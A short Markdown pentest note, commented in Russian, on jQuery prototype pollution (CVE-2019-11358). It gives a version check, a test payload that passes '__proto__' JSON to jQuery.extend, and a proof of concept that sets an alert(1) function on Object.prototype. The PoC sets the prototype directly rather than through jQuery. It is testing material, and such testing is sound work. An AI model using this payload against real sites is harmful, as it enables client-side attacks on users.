# Prototype pollution

### CVE-2019-11358
- check version JQuery:
```jQuery && jQuery.fn && console.log(jQuery.fn.jquery);```
- check vuln:
```
jQuery.extend(true, {}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
console.log("After:", ({}).polluted); // если true/ "yes" — уязвимо
```
- poc: 
```
// 1) Сначала очистим старые следы (ещё раз, на всякий случай)
try { delete Object.prototype.__poc_alert; } catch(e){}

// 2) Безопасно добавим НЕперечисляемое свойство в Object.prototype
Object.defineProperty(Object.prototype, "__poc_alert", {
value: function(){ alert(1); },
writable: true,
configurable: true,
enumerable: false // важно: НЕ перечисляемое — не ломает for..in
});

// 3) Вызовем его
({}).__poc_alert(); // должен показать alert(1)

// 4) Удалим его (очистка)
delete Object.prototype.__poc_alert;
```
